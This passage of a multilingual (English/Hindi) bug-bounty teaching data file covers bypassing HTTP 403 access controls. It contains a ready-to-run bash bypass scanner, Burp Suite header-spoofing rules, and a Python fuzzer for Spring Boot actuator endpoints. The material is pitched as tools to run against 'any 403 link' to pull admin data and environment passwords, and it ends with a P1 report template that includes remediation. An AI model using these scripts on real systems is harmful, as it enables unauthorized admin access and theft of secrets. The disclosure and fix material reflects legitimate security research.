      hi: "एडमिन डेटा डाउनलोड करें, प्रूफ स्क्रीनशॉट्स लें और P1/P2 रिपोर्ट सबमिट करें।",
    },
    steps: [
      {
        en: "Navigate the bypassed endpoint to extract administrative capabilities: user management, database exports, or environment secrets.",
        simple: "Explore the unlocked admin page and download proofs.",
        hi: "खुले हुए एडमिन पेज से यूज़र लिस्ट या सेटिंग्स का प्रूफ निकालें।",
      },
      {
        en: "Demonstrate the exact delta: Show the 403 Forbidden on the default request side-by-side with the 200 OK on the bypassed request.",
        simple: "Show side-by-side proof: 403 on standard request vs 200 OK on bypassed request.",
        hi: "साइड-बाय-साइड प्रूफ दिखाएं: नॉर्मल रिक्वेस्ट पर 403 vs बाईपास रिक्वेस्ट पर 200 OK।",
      },
      {
        en: "Submit the report highlighting Broken Object Level Authorization (BOLA) and Security Misconfiguration.",
        simple: "File the report under Broken Access Control for maximum payout.",
        hi: "Broken Access Control के तहत हाई-बाउंटी रिपोर्ट सबमिट करें।",
      },
    ],
    commandsOrPayloads: [
      "# Side-by-side reproduction proof:",
      "curl -s -o /dev/null -w '%{http_code}' https://target.com/admin/users # Returns 403",
      "curl -s -o /dev/null -w '%{http_code}' https://target.com/admin/..;/admin/users # Returns 200",
    ],
    keyTargets: [
      "Admin user management & role elevation",
      "Database backup downloads",
      "Proof of Concept HTTP requests and responses",
    ],
  },
];

// ─── 3. 403 ATTACK LAB & AUTOMATION SCRIPTS ──────────────────────────────────
export const FORBIDDEN_TOOLS_STASH: ForbiddenToolSnippet[] = [
  {
    id: "bash-403-bypasser",
    title: {
      en: "All-in-One 403 Bypasser Bash Script (Multi-Mutation Engine)",
      simple: "Automated Bash Tool to Fire 40+ Bypass Techniques at Any 403 URL",
      hi: "किसी भी 403 URL पर 40+ बाईपास तकनीकें चलाने वाली Bash स्क्रिप्ट",
    },
    description: {
      en: "High-speed bash script that automatically tests header injections, matrix parameters, path encodings, and HTTP verb switches against a target 403 endpoint and reports any 200 OK or 302 Found response.",
      simple: "Run this script against any 403 link. It tries 40 different bypass tricks in 5 seconds and tells you which one worked.",
      hi: "यह स्क्रिप्ट 403 वाले लिंक पर 5 सेकंड में 40 अलग-अलग बाईपास ट्रिक्स टेस्ट करके बताती है कि कौन सी काम कर गई।",
    },
    category: "bash_scanner",
    language: "bash",
    code: `#!/usr/bin/env bash
# Usage: ./bypass403.sh https://target.com/admin

URL="$1"
DOMAIN=$(echo "$URL" | awk -F/ '{print $3}')
PATH_URI=$(echo "$URL" | grep / | cut -d/ -f4-)

echo "[*] Testing 403 Bypasses against: $URL"

# 1. Header Injections (X-Original-URL, Rewrite, Localhost)
HEADERS=(
  "X-Original-URL: /$PATH_URI"
  "X-Rewrite-URL: /$PATH_URI"
  "X-Forwarded-For: 127.0.0.1"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "X-Host: localhost"
  "X-Forwarded-Host: localhost"
)

echo "\\n[+] Testing Header Injections..."
for H in "\${HEADERS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "$H" "$URL")
  if [[ "$CODE" =~ ^(200|301|302)$ ]]; then
    echo "  [!] BYPASS FOUND! Header: '$H' -> HTTP $CODE"
  fi
done

# 2. Path Mutations
MUTATIONS=(
  "$URL/"
  "$URL//"
  "$URL/."
  "$URL/..;/"
  "$URL/..;/$PATH_URI"
  "https://$DOMAIN/%2e/$PATH_URI"
  "https://$DOMAIN/%20$PATH_URI%20"
  "$URL.json"
  "$URL.html"
  "$URL;foo=bar"
  "$URL?anything"
  "$URL#"
)

echo "\\n[+] Testing Path & Matrix Mutations..."
for M in "\${MUTATIONS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$M")
  if [[ "$CODE" =~ ^(200|301|302)$ ]]; then
    echo "  [!] BYPASS FOUND! Path: '$M' -> HTTP $CODE"
  fi
done

# 3. HTTP Verb Tampering
VERBS=("POST" "HEAD" "OPTIONS" "PUT" "TRACE" "PATCH")
echo "\\n[+] Testing HTTP Verbs..."
for V in "\${VERBS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X "$V" "$URL")
  if [[ "$CODE" =~ ^(200|301|302)$ ]]; then
    echo "  [!] BYPASS FOUND! Verb: '$V' -> HTTP $CODE"
  fi
done`,
    howToUse: {
      en: "Save as `bypass403.sh`, make executable with `chmod +x bypass403.sh`, and run `./bypass403.sh https://target.com/admin`. Any line starting with [!] BYPASS FOUND is your winning vector!",
      simple: "Save and run this script against any 403 link to test all bypasses automatically.",
      hi: "`chmod +x bypass403.sh` करें और `./bypass403.sh https://target.com/admin` चलाएं। जहाँ [!] BYPASS FOUND दिखे, वो आपका काम कर गया!",
    },
  },
  {
    id: "burp-match-replace-403",
    title: {
      en: "Burp Suite Match and Replace Rules for 403 Headers",
      simple: "Automatically Add 403 Bypass Headers to Every Burp Request",
      hi: "Burp Suite में हर रिक्वेस्ट के साथ अपने आप बाईपास हेडर्स जोड़ने का नियम",
    },
    description: {
      en: "Pre-configured Match & Replace rules for Burp Suite Proxy to automatically inject localhost and origin spoofing headers into all outgoing requests while browsing.",
      simple: "Settings to paste into Burp Suite so it automatically adds bypass headers to every page you visit.",
      hi: "Burp Suite की यह सेटिंग आपके हर क्लिक के साथ अपने आप 403 बाईपास हेडर भेजती है।",
    },
    category: "burp_rules",
    language: "json",
    code: `{
  "burp_match_and_replace_rules": [
    {
      "comment": "403 Bypass: X-Forwarded-For Localhost",
      "enabled": true,
      "type": "Request header",
      "match": "^User-Agent: (.*)",
      "replace": "User-Agent: $1\\r\\nX-Forwarded-For: 127.0.0.1"
    },
    {
      "comment": "403 Bypass: X-Custom-IP-Authorization",
      "enabled": true,
      "type": "Request header",
      "match": "^Host: (.*)",
      "replace": "Host: $1\\r\\nX-Custom-IP-Authorization: 127.0.0.1"
    },
    {
      "comment": "403 Bypass: X-Originating-IP",
      "enabled": true,
      "type": "Request header",
      "match": "^Accept: (.*)",
      "replace": "Accept: $1\\r\\nX-Originating-IP: 127.0.0.1"
    }
  ]
}`,
    howToUse: {
      en: "In Burp Suite -> Proxy -> Proxy Settings -> Match and Replace -> Add rules. Now, whenever you navigate through Burp, every 403 restricted page will automatically be tested with localhost headers!",
      simple: "Add these rules in Burp's Match and Replace tab to browse seamlessly.",
      hi: "Burp के Match and Replace में ये रूल्स जोड़ें। ब्राउज़ करते समय अगर कोई 403 पेज होगा, तो वो अपने आप बाईपास होकर खुल जाएगा!",
    },
  },
  {
    id: "python-actuator-matrix-fuzzer",
    title: {
      en: "Spring Boot Actuator Matrix Path Fuzzer (Python)",
      simple: "Python Script to Bypass 403 on Spring Actuators (/actuator/env)",
      hi: "Spring Boot Actuator पर 403 बाईपास करने के लिए पाइथन स्क्रिप्ट",
    },
    description: {
      en: "Specialized Python fuzzer that targets Spring Boot `/actuator` endpoints and tests matrix parameters and semicolon permutations to dump environment secrets.",
      simple: "Python script that unlocks blocked Spring Boot /actuator/env pages to dump passwords.",
      hi: "यह स्क्रिप्ट स्प्रिंग बूट के 403 ब्लॉक को तोड़कर सीधे डेटाबेस पासवर्ड और सीक्रेट्स निकालती है।",
    },
    category: "python_fuzzer",
    language: "python",
    code: `import requests
import sys

def test_actuator_bypasses(base_url):
    endpoints = ["env", "heapdump", "beans", "mappings", "configprops"]
    mutations = [
        "/actuator/{ep}",
        "/actuator;foo=bar/{ep}",
        "/actuator/..;/{ep}",
        "/actuator/..;/actuator/{ep}",
        "/;/actuator/{ep}",
        "/./actuator/{ep}",
        "/actuator.json/{ep}",
        "/actuator/{ep}.json"
    ]
    
    print(f"[*] Testing Spring Actuator Bypasses against: {base_url}")
    
    for ep in endpoints:
        for mut in mutations:
            test_path = mut.format(ep=ep)
            full_url = f"{base_url.rstrip('/')}{test_path}"
            
            try:
                res = requests.get(full_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                if res.status_code == 200:
                    print(f"[!] CRITICAL BYPASS! {full_url} -> HTTP 200 OK (Content Length: {len(res.content)})")
                    if "activeProfiles" in res.text or "propertySources" in res.text:
                        print(f"    [+] CONFIRMED ENV LEAK! Secrets found at: {full_url}")
            except Exception:
                pass

# Usage: test_actuator_bypasses("https://target.com")`,
    howToUse: {
      en: "Run with `python3 actuator_fuzzer.py`. If any line shows `[!] CRITICAL BYPASS!`, you have bypassed the 403 barrier and obtained an active Spring environment dump (CVSS 9.8 P1)!",
      simple: "Run this script against any website using Spring Boot to find exposed passwords.",
      hi: "पाइथन स्क्रिप्ट रन करें। अगर `CRITICAL BYPASS` दिखे तो समझें कि 403 टूट गया और पूरे डेटाबेस पासवर्ड्स मिल गए!",
    },
  },
];

// ─── 4. HACKERONE / BUGCROWD P1/P2 REPORT TEMPLATES ───────────────────────────
export const FORBIDDEN_REPORT_TEMPLATES: ForbiddenReportTemplate[] = [
  {
    id: "p1-broken-access-control-403-bypass",
    title: {
      en: "Critical Broken Access Control via 403 Forbidden Matrix Path Bypass Exposing Admin Dashboard",
      simple: "P1 Report: Bypass 403 on Admin Dashboard Using Semicolon Path Traversal",
      hi: "P1 रिपोर्ट: मैट्रिक्स पाथ बाईपास (/..;/) के ज़रिये 403 तोड़कर एडमिन पैनल का पूर्ण एक्सेस",
    },
    vulnType: "Broken Access Control (BOLA / Path Traversal)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    severity: "critical",
    reportMarkdown: `## Summary
A Critical Broken Access Control vulnerability was identified in the reverse proxy routing layer. The administrative interface located at \`/admin\` is configured to reject unauthorized requests with an **HTTP 403 Forbidden** status code. However, by appending a Tomcat/Spring matrix traversal sequence (\`/admin/..;/admin\`), the reverse proxy's access restriction is completely bypassed, granting unauthenticated access to the full administrative dashboard and user management functions.

## Vulnerability Details
- **Affected URL**: \`https://target.com/admin\`
- **Bypass URL**: \`https://target.com/admin/..;/admin/users\`
- **CWE**: CWE-284: Improper Access Control / CWE-22: Path Traversal
- **CVSS 3.1 Score**: 9.1 (Critical)

## Steps to Reproduce

### Step 1: Default Behavior (Access Denied)
When requesting the administrative endpoint directly, the edge reverse proxy enforces access control and responds with HTTP 403:

\`\`\`bash
curl -i -s https://target.com/admin/users
\`\`\`

**Response:**
\`\`\`http
HTTP/1.1 403 Forbidden
Server: nginx
Content-Type: text/html

<html><center><h1>403 Forbidden: Access Denied</h1></center></html>
\`\`\`

### Step 2: Access Control Bypass via Matrix Semicolon Mutation
Sending the request with a matrix traversal sequence:

\`\`\`bash
curl -i -s "https://target.com/admin/..;/admin/users" -H "Accept: application/json"
\`\`\`

**Response (HTTP 200 OK - Access Granted):**
\`\`\`http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: application/json

{
  "total_users": 1420,
  "users": [
    {"id": 1, "username": "superadmin", "email": "admin@target.com", "role": "OWNER"},
    {"id": 2, "username": "finance_lead", "email": "finance@target.com", "role": "ADMIN"}
  ]
}
\`\`\`

## Impact
An unauthenticated remote attacker can bypass the reverse proxy's perimeter security and access administrative endpoints without credentials. This allows modifying user roles, viewing private corporate data, and executing privileged actions.

## Root Cause Analysis
The front-end reverse proxy (Nginx) normalizes \`/..;/\` before evaluating location blocks, concluding that the target path does not match \`location /admin\`. However, the downstream application server (Tomcat / Spring Boot) treats the semicolon as a matrix parameter delimiter, strips it, and routes the request directly to the \`/admin/users\` handler.

## Remediation & Fix Recommendation
1. **Synchronize Normalization Rules**: Ensure the reverse proxy and backend application server handle URI matrix parameters and semicolons identically. In Nginx, ensure path matching blocks cannot be bypassed using trailing characters:
   \`\`\`nginx
   # Reject requests containing semicolons in URI paths
   if ($request_uri ~* ";") {
       return 404;
   }
   \`\`\`
2. **Enforce Authentication at the Application Layer**: Never rely solely on reverse proxy URL filtering for authorization. Enforce role-based access checks directly inside application controllers (e.g. \`@PreAuthorize("hasRole('ADMIN')")\`).`,
  },
];
